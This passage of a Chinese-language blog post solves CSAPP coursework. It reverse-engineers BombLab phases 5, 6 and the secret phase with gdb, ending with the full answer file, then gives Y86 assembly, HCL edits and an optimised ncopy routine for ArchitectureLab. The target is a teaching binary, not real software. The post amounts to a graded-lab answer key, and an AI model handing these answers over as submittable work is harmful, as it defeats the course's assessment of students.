   0x00000000004010a0 <+62>:	mov    %dl,0x10(%rsp,%rax,1)
   0x00000000004010a4 <+66>:	add    $0x1,%rax
   0x00000000004010a8 <+70>:	cmp    $0x6,%rax
   0x00000000004010ac <+74>:	jne    0x40108b <phase_5+41>

分析知该循环代码依次将我们所输入的六个字符的低四位作为索引，取0x4024b0作为基地址，分六次将索引对应的字符取出存入%rsp + 16 + bias处的栈中，于是我们先反汇编看下0x4024b0地址处存储的信息
(gdb) x /s 0x4024b0
0x4024b0 <array.3449>:	"maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?"

由于索引为我们输入字符的低四位，即索引范围为0 ~ 15，对应该字符串的
	maduiersnfotvbyl

部分，继续查看phase_5()函数代码
   0x00000000004010ae <+76>:	movb   $0x0,0x16(%rsp)
   0x00000000004010b3 <+81>:	mov    $0x40245e,%esi
   0x00000000004010b8 <+86>:	lea    0x10(%rsp),%rdi
   0x00000000004010bd <+91>:	callq  0x401338 <strings_not_equal>
   0x00000000004010c2 <+96>:	test   %eax,%eax
   0x00000000004010c4 <+98>:	je     0x4010d9 <phase_5+119>
   0x00000000004010c6 <+100>:	callq  0x40143a <explode_bomb>

string_not_equal在之前的谜题里已见过，易知此段代码作用为将刚才通过索引选出的6个字符与首地址为0x40245e处的字符串进行比较，若不匹配则炸弹爆炸，故查看地址0x40245e处字符串内容
(gdb) x /s 0x40245e
0x40245e:	"flyers"

这六个字符分别对应谜题字符串中的[9, 15, 14, 5, 6, 7]位(从0起计数)，而高四位不做限制，故本题答案不唯一，查阅ascii表易得其中两个答案为"9?>567", "IONEFG"，其余答案不一一枚举。phase_5()函数最后几行代码用于检测是否发生栈溢出，在此不做更多介绍
```

## phase_6

```assembly
反汇编phase_6()函数
   0x00000000004010fc <+8>:		sub    $0x50,%rsp
   0x0000000000401100 <+12>:	mov    %rsp,%r13
   0x0000000000401103 <+15>:	mov    %rsp,%rsi
   0x0000000000401106 <+18>:	callq  0x40145c <read_six_numbers>
   0x000000000040110b <+23>:	mov    %rsp,%r14

在栈上开辟80字节空间后，将%r13, %rsi, %r14寄存器的值都设为当前栈顶地址。且知本题需输入六个数字
   0x000000000040110e <+26>:	mov    $0x0,%r12d
   0x0000000000401114 <+32>:	mov    %r13,%rbp
   0x0000000000401117 <+35>:	mov    0x0(%r13),%eax
   0x000000000040111b <+39>:	sub    $0x1,%eax
   0x000000000040111e <+42>:	cmp    $0x5,%eax
   0x0000000000401121 <+45>:	jbe    0x401128 <phase_6+52>
   0x0000000000401123 <+47>:	callq  0x40143a <explode_bomb>
   0x0000000000401128 <+52>:	add    $0x1,%r12d
   0x000000000040112c <+56>:	cmp    $0x6,%r12d
   0x0000000000401130 <+60>:	je     0x401153 <phase_6+95>
   0x0000000000401132 <+62>:	mov    %r12d,%ebx
   0x0000000000401135 <+65>:	movslq %ebx,%rax
   0x0000000000401138 <+68>:	mov    (%rsp,%rax,4),%eax
   0x000000000040113b <+71>:	cmp    %eax,0x0(%rbp)
   0x000000000040113e <+74>:	jne    0x401145 <phase_6+81>
   0x0000000000401140 <+76>:	callq  0x40143a <explode_bomb>
   0x0000000000401145 <+81>:	add    $0x1,%ebx
   0x0000000000401148 <+84>:	cmp    $0x5,%ebx
   0x000000000040114b <+87>:	jle    0x401135 <phase_6+65>
   0x000000000040114d <+89>:	add    $0x4,%r13
   0x0000000000401151 <+93>:	jmp    0x401114 <phase_6+32>

分析知本谜题六个输入数字均小于等于6，且六个数字各不相同
   0x0000000000401153 <+95>:	lea    0x18(%rsp),%rsi
   0x0000000000401158 <+100>:	mov    %r14,%rax
   0x000000000040115b <+103>:	mov    $0x7,%ecx
   0x0000000000401160 <+108>:	mov    %ecx,%edx
   0x0000000000401162 <+110>:	sub    (%rax),%edx
   0x0000000000401164 <+112>:	mov    %edx,(%rax)
   0x0000000000401166 <+114>:	add    $0x4,%rax
   0x000000000040116a <+118>:	cmp    %rsi,%rax
   0x000000000040116d <+121>:	jne    0x401160 <phase_6+108>

设六个输入按顺序为a[0]至a[5]，上述循环令a[i] = 7 - a[i]
   0x000000000040116f <+123>:	mov    $0x0,%esi
   0x0000000000401174 <+128>:	jmp    0x401197 <phase_6+163>
   0x0000000000401176 <+130>:	mov    0x8(%rdx),%rdx
   0x000000000040117a <+134>:	add    $0x1,%eax
   0x000000000040117d <+137>:	cmp    %ecx,%eax
   0x000000000040117f <+139>:	jne    0x401176 <phase_6+130>
   0x0000000000401181 <+141>:	jmp    0x401188 <phase_6+148>
   0x0000000000401183 <+143>:	mov    $0x6032d0,%edx
   0x0000000000401188 <+148>:	mov    %rdx,0x20(%rsp,%rsi,2)
   0x000000000040118d <+153>:	add    $0x4,%rsi
   0x0000000000401191 <+157>:	cmp    $0x18,%rsi
   0x0000000000401195 <+161>:	je     0x4011ab <phase_6+183>
   0x0000000000401197 <+163>:	mov    (%rsp,%rsi,1),%ecx
   0x000000000040119a <+166>:	cmp    $0x1,%ecx
   0x000000000040119d <+169>:	jle    0x401183 <phase_6+143>
   0x000000000040119f <+171>:	mov    $0x1,%eax
   0x00000000004011a4 <+176>:	mov    $0x6032d0,%edx
   0x00000000004011a9 <+181>:	jmp    0x401176 <phase_6+130>

分析知有一链表首地址为0x6032d0，该链表一个结点16字节，后8字节用于存放指向下一个结点的指针，于是顺藤摸瓜找出该链表所有结点，设结点按顺序分别为b[0]至b[5]，上述代码作用为将a[i] - 1对应的结点地址放于%rsp + 32为基地址的栈中(e.g. 假设a[0] = 3，则将b[2]放于(%rsp + 32 + 0 * 8)处空间中)
(gdb) x /16xb 0x6032d0
0x6032d0 <node1>:	0x4c	0x01	0x00	0x00	0x01	0x00	0x00	0x00
0x6032d8 <node1+8>:	0xe0	0x32	0x60	0x00	0x00	0x00	0x00	0x00
(gdb) x /16xb 0x6032e0
0x6032e0 <node2>:	0xa8	0x00	0x00	0x00	0x02	0x00	0x00	0x00
0x6032e8 <node2+8>:	0xf0	0x32	0x60	0x00	0x00	0x00	0x00	0x00
(gdb) x /16xb 0x6032f0
0x6032f0 <node3>:	0x9c	0x03	0x00	0x00	0x03	0x00	0x00	0x00
0x6032f8 <node3+8>:	0x00	0x33	0x60	0x00	0x00	0x00	0x00	0x00
(gdb) x /16xb 0x603300
0x603300 <node4>:	0xb3	0x02	0x00	0x00	0x04	0x00	0x00	0x00
0x603308 <node4+8>:	0x10	0x33	0x60	0x00	0x00	0x00	0x00	0x00
(gdb) x /16xb 0x603310
0x603310 <node5>:	0xdd	0x01	0x00	0x00	0x05	0x00	0x00	0x00
0x603318 <node5+8>:	0x20	0x33	0x60	0x00	0x00	0x00	0x00	0x00
(gdb) x /16xb 0x603320
0x603320 <node6>:	0xbb	0x01	0x00	0x00	0x06	0x00	0x00	0x00
0x603328 <node6+8>:	0x00	0x00	0x00	0x00	0x00	0x00	0x00

继续阅读
   0x00000000004011ab <+183>:	mov    0x20(%rsp),%rbx
   0x00000000004011b0 <+188>:	lea    0x28(%rsp),%rax
   0x00000000004011b5 <+193>:	lea    0x50(%rsp),%rsi
   0x00000000004011ba <+198>:	mov    %rbx,%rcx
   0x00000000004011bd <+201>:	mov    (%rax),%rdx
   0x00000000004011c0 <+204>:	mov    %rdx,0x8(%rcx)
   0x00000000004011c4 <+208>:	add    $0x8,%rax
   0x00000000004011c8 <+212>:	cmp    %rsi,%rax
   0x00000000004011cb <+215>:	je     0x4011d2 <phase_6+222>
   0x00000000004011cd <+217>:	mov    %rdx,%rcx
   0x00000000004011d0 <+220>:	jmp    0x4011bd <phase_6+201>

上述代码将结点按新的顺序链成链表
   0x00000000004011d2 <+222>:	movq   $0x0,0x8(%rdx)
   0x00000000004011da <+230>:	mov    $0x5,%ebp
   0x00000000004011df <+235>:	mov    0x8(%rbx),%rax
   0x00000000004011e3 <+239>:	mov    (%rax),%eax
   0x00000000004011e5 <+241>:	cmp    %eax,(%rbx)
   0x00000000004011e7 <+243>:	jge    0x4011ee <phase_6+250>
   0x00000000004011e9 <+245>:	callq  0x40143a <explode_bomb>
   0x00000000004011ee <+250>:	mov    0x8(%rbx),%rbx
   0x00000000004011f2 <+254>:	sub    $0x1,%ebp
   0x00000000004011f5 <+257>:	jne    0x4011df <phase_6+235>

分析知正确的结点值应从高到低排列，又因比较结点值时使用的是%eax寄存器，故比较的是各结点前四字节的值，即根据我们输入的六个不同数值a[0]至a[5]，分别取a[i] = 7 - a[i]，再用新的a[i]值将原链表结点顺序重排得新链表，保证新链表的结点值为从高至低排列。原各结点值如下表
```

| node1 | node2 | node3 | node4 | node5 | node6 |
| :---: | :---: | :---: | :---: | :---: | :---: |
| 0x14c | 0xa8  | 0x39c | 0x2b3 | 0x1dd | 0x1bb |

```
按从大到小排列为 [node3, node4, node5, node6, node1, node2]
	a[0]新 - 1 = 3
	a[1]新 - 1 = 4
	...
	a[5]新 - 1 = 2

而
	a[i]新 = 7 - a[i]旧

故
	a旧 = [4, 3 ,2 ,1 ,6, 5]

即应输入六数分别为[4, 3 ,2 ,1 ,6, 5]
```

## secret_phase

```assembly
反汇编phase_defused()函数
   0x00000000004015c4 <+0>:		sub    $0x78,%rsp
   0x00000000004015c8 <+4>:		mov    %fs:0x28,%rax
   0x00000000004015d1 <+13>:	mov    %rax,0x68(%rsp)
   0x00000000004015d6 <+18>:	xor    %eax,%eax
   0x00000000004015d8 <+20>:	cmpl   $0x6,0x202181(%rip)        # 0x603760 <num_input_strings>
   0x00000000004015df <+27>:	jne    0x40163f <phase_defused+123>

发现只有六个谜题都破解后才会触发隐藏谜题，继续向下分析
   0x00000000004015e1 <+29>:	lea    0x10(%rsp),%r8
   0x00000000004015e6 <+34>:	lea    0xc(%rsp),%rcx
   0x00000000004015eb <+39>:	lea    0x8(%rsp),%rdx
   0x00000000004015f0 <+44>:	mov    $0x402619,%esi
   0x00000000004015f5 <+49>:	mov    $0x603870,%edi
   0x00000000004015fa <+54>:	callq  0x400bf0 <__isoc99_sscanf@plt>
   0x00000000004015ff <+59>:	cmp    $0x3,%eax
   0x0000000000401602 <+62>:	jne    0x401635 <phase_defused+113>

发现函数调用首地址为0x400bf0的sscanf()函数读入数据，查看%0x402619处内容，得
(gdb) x /s 0x402619
0x402619:	"%d %d %s"

故知一次读入两个int型数据和一个字符串，分别存入0x8(%rsp), 0xc(%rsp), 0x10(%rsp)中
   0x0000000000401604 <+64>:	mov    $0x402622,%esi
   0x0000000000401609 <+69>:	lea    0x10(%rsp),%rdi
   0x000000000040160e <+74>:	callq  0x401338 <strings_not_equal>
   0x0000000000401613 <+79>:	test   %eax,%eax
   0x0000000000401615 <+81>:	jne    0x401635 <phase_defused+113>

接着phase_defused()调用strings_not_euqal()检测我们输入的字符串与首地址为0x402622处的模式串是否匹配，于是查看该地址处的字符串得正解
(gdb) x /s 0x402622
0x402622:	"DrEvil"

需注意，phase_defused()函数并未调用诸如read_line()等函数读取输入，而是直接默认从0x603870地址处读取数据。而前六个谜题每个都调用了一次read_line()函数，再通过
	mov %rax, %rdi

指令将输入的数据传给相应函数，于是猜测0x603870为main()函数中某次调用read_line()参数获得用户输入后传给phase_x()函数的地址，检查六次调用read_line()后read_line()传送给phase_x()函数的地址，得六个地址分别为
	0x603780
	0x6037d0
	0x603820
	0x603870
	0x6038c0
	0x603910

知0x603870为第四次read_line()后传递给phase_4()的输入数据的首地址，而第四个谜题需输入两个int型变量，因此只需在第四题的答案后面加上字符串"DrEvil"即可在六个谜题结束后触发隐藏谜题，继续分析
   0x0000000000401617 <+83>:	mov    $0x4024f8,%edi
   0x000000000040161c <+88>:	callq  0x400b10 <puts@plt>
   0x0000000000401621 <+93>:	mov    $0x402520,%edi
   0x0000000000401626 <+98>:	callq  0x400b10 <puts@plt>
   0x000000000040162b <+103>:	mov    $0x0,%eax
   0x0000000000401630 <+108>:	callq  0x401242 <secret_phase>
   0x0000000000401635 <+113>:	mov    $0x402558,%edi
   0x000000000040163a <+118>:	callq  0x400b10 <puts@plt>
   0x000000000040163f <+123>:	mov    0x68(%rsp),%rax
   0x0000000000401644 <+128>:	xor    %fs:0x28,%rax
   0x000000000040164d <+137>:	je     0x401654 <phase_defused+144>
   0x000000000040164f <+139>:	callq  0x400b30 <__stack_chk_fail@plt>
   0x0000000000401654 <+144>:	add    $0x78,%rsp
   0x0000000000401658 <+148>:	retq   

函数输出两字符串，调用secret_phase()函数，再输出一字符串，检查栈是否溢出，结束。于是接下来分析secret_phase()函数
   0x0000000000401242 <+0>:		push   %rbx
   0x0000000000401243 <+1>:		callq  0x40149e <read_line>
   0x0000000000401248 <+6>:		mov    $0xa,%edx
   0x000000000040124d <+11>:	mov    $0x0,%esi
   0x0000000000401252 <+16>:	mov    %rax,%rdi
   0x0000000000401255 <+19>:	callq  0x400bd0 <strtol@plt>
   0x000000000040125a <+24>:	mov    %rax,%rbx
   0x000000000040125d <+27>:	lea    -0x1(%rax),%eax
   0x0000000000401260 <+30>:	cmp    $0x3e8,%eax
   0x0000000000401265 <+35>:	jbe    0x40126c <secret_phase+42>
   0x0000000000401267 <+37>:	callq  0x40143a <explode_bomb>

通过调用read_line()函数读入字符串，并调用strtol()函数将其转换为十进制数字，且该数字应小于等于0x3e9，否则炸弹爆炸
   0x000000000040126c <+42>:	mov    %ebx,%esi
   0x000000000040126e <+44>:	mov    $0x6030f0,%edi
   0x0000000000401273 <+49>:	callq  0x401204 <fun7>
   0x0000000000401278 <+54>:	cmp    $0x2,%eax
   0x000000000040127b <+57>:	je     0x401282 <secret_phase+64>
   0x000000000040127d <+59>:	callq  0x40143a <explode_bomb>
   0x0000000000401282 <+64>:	mov    $0x402438,%edi
   0x0000000000401287 <+69>:	callq  0x400b10 <puts@plt>
   0x000000000040128c <+74>:	callq  0x4015c4 <phase_defused>
   0x0000000000401291 <+79>:	pop    %rbx
   0x0000000000401292 <+80>:	retq   

函数将地址0x6030f0送入%rdi后，调用首地址为0x401204的fun7()函数，且知该函数必须返回数值2，反汇编fun7()函数进行分析
   0x0000000000401204 <+0>:		sub    $0x8,%rsp
   0x0000000000401208 <+4>:		test   %rdi,%rdi
   0x000000000040120b <+7>:		je     0x401238 <fun7+52>
   0x000000000040120d <+9>:		mov    (%rdi),%edx
   0x000000000040120f <+11>:	cmp    %esi,%edx
   0x0000000000401211 <+13>:	jle    0x401220 <fun7+28>
   0x0000000000401213 <+15>:	mov    0x8(%rdi),%rdi
   0x0000000000401217 <+19>:	callq  0x401204 <fun7>
   0x000000000040121c <+24>:	add    %eax,%eax
   0x000000000040121e <+26>:	jmp    0x40123d <fun7+57>
   0x0000000000401220 <+28>:	mov    $0x0,%eax
   0x0000000000401225 <+33>:	cmp    %esi,%edx
   0x0000000000401227 <+35>:	je     0x40123d <fun7+57>
   0x0000000000401229 <+37>:	mov    0x10(%rdi),%rdi
   0x000000000040122d <+41>:	callq  0x401204 <fun7>
   0x0000000000401232 <+46>:	lea    0x1(%rax,%rax,1),%eax
   0x0000000000401236 <+50>:	jmp    0x40123d <fun7+57>
   0x0000000000401238 <+52>:	mov    $0xffffffff,%eax
   0x000000000040123d <+57>:	add    $0x8,%rsp
   0x0000000000401241 <+61>:	retq   

尝试将该函数反编译为c代码风格
fun7(x, y)
x in %rdi, y in %rsi, p for %rdx
	if (x == 0) return -1;
	p = *x;
	if (p <= y) {
		if (p == y) return 0;
		return 2 * fun7(x, y) + 1;
	}
	x = *(x + 8);
	return 2 * fun7(x, y);
	
初次调用fun7()函数时，x值为0x6030f0, y值为我们输入的一个字符串转换所得数值，结合0x6030f0内存地址的值等，可以推出一个答案y值为22(0x16).在我通过此方法推出一个答案值后，参考他人题解，知0x6030f0为一二叉树根节点地址，该数每个结点含一个值和两个指向左右儿子的指针
(gdb) x /80a 0x6030f0
0x6030f0 <n1>:	0x24	0x603110 <n21>
0x603100 <n1+16>:	0x603130 <n22>	0x0
0x603110 <n21>:	0x8	0x603190 <n31>
0x603120 <n21+16>:	0x603150 <n32>	0x0
0x603130 <n22>:	0x32	0x603170 <n33>
0x603140 <n22+16>:	0x6031b0 <n34>	0x0
0x603150 <n32>:	0x16	0x603270 <n43>
0x603160 <n32+16>:	0x603230 <n44>	0x0
0x603170 <n33>:	0x2d	0x6031d0 <n45>
0x603180 <n33+16>:	0x603290 <n46>	0x0
0x603190 <n31>:	0x6	0x6031f0 <n41>
0x6031a0 <n31+16>:	0x603250 <n42>	0x0
0x6031b0 <n34>:	0x6b	0x603210 <n47>
0x6031c0 <n34+16>:	0x6032b0 <n48>	0x0

由以上信息可构建树为
```

{% asset_img bomblab_tree.png %}

```
故可的答案为22(0x16), 20(0x14).

至此，全部谜题破解
fez@LAPTOP-MB5DL415:/mnt/d/repositories/CSAPP/Labs/BombLab$ cat phases.txt 
Border relations with Canada have never been better.
1 2 4 8 16 32
0 207
0 0 DrEvil
IONEFG
4 3 2 1 6 5
20
fez@LAPTOP-MB5DL415:/mnt/d/repositories/CSAPP/Labs/BombLab$ ./bomb phases.txt 
Welcome to my fiendish little bomb. You have 6 phases with
which to blow yourself up. Have a nice day!
Phase 1 defused. How about the next one?
That's number 2.  Keep going!
Halfway there!
So you got that one.  Try this one.
Good work!  On to the next...
Curses, you've found the secret phase!
But finding it and solving it are quite different...
Wow! You've defused the secret stage!
Congratulations! You've defused the bomb!
																2021/7/27
																21:16
```

# ArchitectureLab

## 准备

这个实验无疑是目前已做三个实验里花费我最多精力的，很可能也是所有实验里最花费精力的一个。如某人所言，本实验实验环境的搭建甚至比实验内容本身还要困难。搭建环境的过程不知掉了多少头发，可谓是十分痛苦了，令我一度想要放弃本实验。现在磕磕绊绊把实验做完，回顾全过程，记录下实验中遇到的一些难点，即是反思回味，也希望能帮助同我当初一样面对这般那般的问题而一筹莫展的朋友

我的实验环境为WSL版的Ubuntu，由于没有安装相关库，模拟器不支持GUI界面，因此在解压sim包后，将sim目录下的`Makefile`文件中涉及GUI的三行注释掉

```makefile
#GUIMODE=-DHAS_GUI
#TKLIBS=-L/usr/lib -ltk -ltcl
#TKINC=-isystem /usr/include
```

注释GUI相关东西是我从别人博客学到的，在整个实验过程中我也没有使用过GUI。我自己也尝试过安装tk与tcl，但是如果安装版本是8.6及以上，仍不能正常使用，**若想要在本实验中使用GUI，tk与tcl必须安装为8.5版本及以下**，接着尝试

```
unix> make clean
unix> make
```

如果报错信息包含关键词`flex`和`bison`，可能是没有安装相关依赖软件，尝试安装

```
unix> sudo apt-get install flex
unix> sudo apt-get install bison
```

当在sim目录及其子目录中任意一个进行

```
unix> make
```

时显示某.c文件报以下错误

```
build fails with tcl 8.6: error: tcl_interp has no member named result
```

请参考[这篇文章](https://stackoverflow.com/questions/66291922/tk-h-looks-for-tcl-h-in-usr-include-but-tcl-h-is-in-usr-include-tcl-i-dont-h)查看解决方案

## Part A

这一部分内容较为简单，正如lab介绍文档中所言，part A部分是为后续实验准备的热身运动

### sum.ys

```assembly
# Execution begins at address 0
	.pos 0
	irmovq stack, %rsp
	call main
	halt

# Sample linked list
	.align 8
list:
	ele1:
		.quad 0x00a
		.quad ele2
	ele2:
		.quad 0x0b0
		.quad ele3
	ele3:
		.quad 0xc00
		.quad 0

main:
	irmovq list, %rdi
	call sum_list
	ret

# long sum_list(list_ptr ls)
# ls in %rdi
sum_list:
	irmovq $8, %r8
	xorq %rax, %rax
test:
	andq %rdi, %rdi
	je done
	mrmovq (%rdi), %r9
	addq %r9, %rax
	addq %r8, %rdi
	mrmovq (%rdi), %rdi
	jmp test
done:
	ret

	.pos 0x200
stack:
```

```
ArchitectureLab/sim/misc> make sum.yo
./yas sum.ys
ArchitectureLab/sim/misc> ./yis sum.yo
Stopped in 32 steps at PC = 0x13.  Status 'HLT', CC Z=1 S=0 O=0
Changes to registers:
%rax:	0x0000000000000000	0x0000000000000cba
%rsp:	0x0000000000000000	0x0000000000000200
%r8:	0x0000000000000000	0x0000000000000008
%r9:	0x0000000000000000	0x0000000000000c00

Changes to memory:
0x01f0:	0x0000000000000000	0x000000000000005b
0x01f8:	0x0000000000000000	0x0000000000000013
```

### rsum.ys

```assembly
# Execution begins at address 0
	.pos 0
	irmovq stack, %rsp
	call main
	halt

# Sample linked list
	.align 8
list:
	ele1:
		.quad 0x00a
		.quad ele2
	ele2:
		.quad 0x0b0
		.quad ele3
	ele3:
		.quad 0xc00
		.quad 0

main:
	irmovq list, %rdi
	call rsum_list
	ret

# long rsum_list(list_ptr ls)
# ls in %rdi
rsum_list:
	irmovq $8, %r8
	xorq %rax, %rax
	andq %rdi, %rdi
	je null_pointer
	mrmovq (%rdi), %rbx
	pushq %rbx
	addq %r8, %rdi
	mrmovq (%rdi), %rdi
	call rsum_list
	popq %rbx
	addq %rbx, %rax
null_pointer:
	ret

	.pos 0x200
stack:
```

```
ArchitectureLab/sim/misc> make rsum.yo
./yas rsum.ys
ArchitectureLab/sim/misc> ./yis rsum.yo
Stopped in 47 steps at PC = 0x13.  Status 'HLT', CC Z=0 S=0 O=0
Changes to registers:
%rax:	0x0000000000000000	0x0000000000000cba
%rbx:	0x0000000000000000	0x000000000000000a
%rsp:	0x0000000000000000	0x0000000000000200
%r8:	0x0000000000000000	0x0000000000000008

Changes to memory:
0x01c0:	0x0000000000000000	0x0000000000000094
0x01c8:	0x0000000000000000	0x0000000000000c00
0x01d0:	0x0000000000000000	0x0000000000000094
0x01d8:	0x0000000000000000	0x00000000000000b0
0x01e0:	0x0000000000000000	0x0000000000000094
0x01e8:	0x0000000000000000	0x000000000000000a
0x01f0:	0x0000000000000000	0x000000000000005b
0x01f8:	0x0000000000000000	0x0000000000000013
```

### copy.ys

```assembly
# Execution begins at address 0
	.pos 0
	irmovq stack, %rsp
	call main
	halt

	.align 8
# Source block
src:
	.quad 0x00a
	.quad 0x0b0
	.quad 0xc00

# Destination block
dest:
	.quad 0x111
	.quad 0x222
	.quad 0x333

main:
	irmovq src, %rdi
	irmovq dest, %rsi
	irmovq $3, %rdx
	call copy_block
	ret

# long copy_block(long* src, long* dest, long len)
# src in %rdi, dest in %rsi, len in %rdx
copy_block:
	irmovq $1, %r10
	irmovq $8, %r8
	xorq %rax, %rax
loop:
	andq %rdx, %rdx
	je done
	mrmovq (%rdi), %r9
	addq %r8, %rdi
	rmmovq %r9, (%rsi)
	addq %r8, %rsi
	xorq %r9, %rax
	subq %r10, %rdx
	jmp loop
done:
	ret

	.pos 0x200
stack:
```

```
ArchitectureLab/sim/misc> make copy.yo
./yas copy.ys
ArchitectureLab/sim/misc> ./yis copy.yo
Stopped in 41 steps at PC = 0x13.  Status 'HLT', CC Z=1 S=0 O=0
Changes to registers:
%rax:	0x0000000000000000	0x0000000000000cba
%rsp:	0x0000000000000000	0x0000000000000200
%rsi:	0x0000000000000000	0x0000000000000048
%rdi:	0x0000000000000000	0x0000000000000030
%r8:	0x0000000000000000	0x0000000000000008
%r9:	0x0000000000000000	0x0000000000000c00
%r10:	0x0000000000000000	0x0000000000000001

Changes to memory:
0x0030:	0x0000000000000111	0x000000000000000a
0x0038:	0x0000000000000222	0x00000000000000b0
0x0040:	0x0000000000000333	0x0000000000000c00
0x01f0:	0x0000000000000000	0x000000000000006f
0x01f8:	0x0000000000000000	0x0000000000000013

```

## Part B

实验的第二部分也不困难，只需实现一个`iaddq`立即数加功能即可，所需修改部分如下

```assembly
bool instr_valid = icode in 
	{ INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,
	       IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ };

# Does fetched instruction require a regid byte?
bool need_regids =
	icode in { IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, 
		     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ };

# Does fetched instruction require a constant word?
bool need_valC =
	icode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ };

## What register should be used as the B source?
word srcB = [
	icode in { IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  } : rB;
	icode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP;
	1 : RNONE;  # Don't need register
];

## What register should be used as the E destination?
word dstE = [
	icode in { IRRMOVQ } && Cnd : rB;
	icode in { IIRMOVQ, IOPQ, IIADDQ} : rB;
	icode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP;
	1 : RNONE;  # Don't write any register
];

## Select input A to ALU
word aluA = [
	icode in { IRRMOVQ, IOPQ } : valA;
	icode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ } : valC;
	icode in { ICALL, IPUSHQ } : -8;
	icode in { IRET, IPOPQ } : 8;
	# Other instructions don't need ALU
];

## Select input B to ALU
word aluB = [
	icode in { IRMMOVQ, IMRMOVQ, IOPQ, ICALL, 
		      IPUSHQ, IRET, IPOPQ, IIADDQ } : valB;
	icode in { IRRMOVQ, IIRMOVQ } : 0;
	# Other instructions don't need ALU
];

```

后续按照实验手册测试步骤照做即可

## Part C

最后部分稍难一些，需要对流水线有较好理解后自行优化硬件逻辑及汇编代码，尽可能高效地实现函数功能。先说下我对`pipe-full.hcl`文件的修改。首先是听从了实验手册的建议，实现了iaddq立即数加法指令，代码修改同Part B部分。因为函数含循环涉及大量条件跳转，考虑过将跳转预测逻辑修改为后向分支跳转，前向分支不跳转（见习题4.56），但稍加分析认为在本题中修改分支预测逻辑并无提升，遂延用默认预测逻辑

对于ncopy.ys代码的优化，首先是利用实现的iaddq将原本的诸如

```assembly
	irmovq $1, %r10
	addq %r10, %rax
```

两条指令合为一条

```assembly
	iaddq $1, %r10
```

其次注意到

```assembly
 	mrmovq (%rdi), %r10
	rmmovq %r10, (%rsi)
	andq %r10, %r10
```

产生加载/使用冲突，浪费一个时钟周期，通过重排指令顺序将该周期利用起来

```assembly
 	mrmovq (%rdi), %r10
	andq %r10, %r10
	rmmovq %r10, (%rsi)
```

再根据实验手册建议，参考第五章循环展开部分对CPE进行优化

```assembly
	mrmovq (%rdi), %r10	# read val from src...
	mrmovq 8(%rdi), %r11
	mrmovq 16(%rdi), %r12
	mrmovq 24(%rdi), %r13
	andq %r10, %r10		# val <= 0?
	rmmovq %r10, (%rsi)	# ...and store it to dst
	jle Npos1		# if so, goto Npos:
	iaddq $1, %rax		# count++
Npos1:
	andq %r11, %r11
	rmmovq %r11, 8(%rsi)
	jle Npos2
	iaddq $1, %rax
Npos2:
	andq %r12, %r12
	rmmovq %r12, 16(%rsi)
	jle Npos3
	iaddq $1, %rax
Npos3:
	andq %r13, %r13
	rmmovq %r13, 24(%rsi)
	jle Npos4
	iaddq $1, %rax
Npos4:
	iaddq $32, %rdi		# src+=4
	iaddq $32, %rsi		# dst+=4
```

完整代码见下

```assembly
#/* $begin ncopy-ys */
##################################################################
# ncopy.ys - Copy a src block of len words to dst.
# Return the number of positive words (>0) contained in src.
#
# Include your name and ID here.
#
# Describe how and why you modified the baseline code.
#
##################################################################
# Do not modify this portion
# Function prologue.
# %rdi = src, %rsi = dst, %rdx = len
ncopy:

##################################################################
# You can modify this portion
	# Loop header
	xorq %rax, %rax		# count = 0;
	iaddq $-8, %rdx		# len -= 8
	andq %rdx, %rdx		# len < 0?
	jl Remain		# if so, goto Remain:
	
Loop:	
	mrmovq (%rdi), %r10	# read val from src...
	mrmovq 8(%rdi), %r11
	mrmovq 16(%rdi), %r12
	mrmovq 24(%rdi), %r13
	andq %r10, %r10		# val <= 0?
	rmmovq %r10, (%rsi)	# ...and store it to dst
	jle Npos1		# if so, goto Npos:
	iaddq $1, %rax		# count++
Npos1:
	andq %r11, %r11
	rmmovq %r11, 8(%rsi)
	jle Npos2
	iaddq $1, %rax
Npos2:
	andq %r12, %r12
	rmmovq %r12, 16(%rsi)
	jle Npos3
	iaddq $1, %rax
Npos3:
	andq %r13, %r13
	rmmovq %r13, 24(%rsi)
	jle Npos4
	iaddq $1, %rax
Npos4:
	iaddq $32, %rdi		# src+=4
	iaddq $32, %rsi		# dst+=4
	
	mrmovq (%rdi), %r10	# read val from src...
	mrmovq 8(%rdi), %r11
	mrmovq 16(%rdi), %r12
	mrmovq 24(%rdi), %r13
	andq %r10, %r10		# val <= 0?
	rmmovq %r10, (%rsi)	# ...and store it to dst
	jle Npos5		# if so, goto Npos:
	iaddq $1, %rax		# count++
Npos5:
	andq %r11, %r11
	rmmovq %r11, 8(%rsi)
	jle Npos6
	iaddq $1, %rax
Npos6:
	andq %r12, %r12
	rmmovq %r12, 16(%rsi)
	jle Npos7
	iaddq $1, %rax
Npos7:
	andq %r13, %r13
	rmmovq %r13, 24(%rsi)
	jle Npos8
	iaddq $1, %rax
Npos8:
	iaddq $32, %rdi		# src+=4
	iaddq $32, %rsi		# dst+=4
	
	iaddq $-8, %rdx		# len -= 8
	jge Loop			# if so, goto Loop:
Remain:
	iaddq $8, %rdx
	je Done
Final_loop:
	mrmovq (%rdi), %r10	# read val from src...
	andq %r10, %r10		# val <= 0?
	rmmovq %r10, (%rsi)	# ...and store it to dst
	jle Npos9		# if so, goto Npos9:
	iaddq $1, %rax		# count++
Npos9:	
	iaddq $8, %rdi		# src++
	iaddq $8, %rsi		# dst++
	iaddq $-1, %rdx		# len--
	jg Final_loop

##################################################################
# Do not modify the following section of code
# Function epilogue.
Done:
	ret
##################################################################
# Keep the following label at the end of your function
End:
#/* $end ncopy-ys */
```

最终测试

```
unix> make psim VERSION=full
unix> ./psim -t sdriver.yo
unix> ./psim -t ldriver.yo
unix> ./correctness.pl
unix> ./benchmark.pl
```

最终结果`Average CPE`为`8.70`，分数为`35.9`。满分需要`Average CPE`在7.50及以下，暂时先到这里，以后有机会再考虑继续优化，完成这个实验花费了大量时间与精力

## 小结

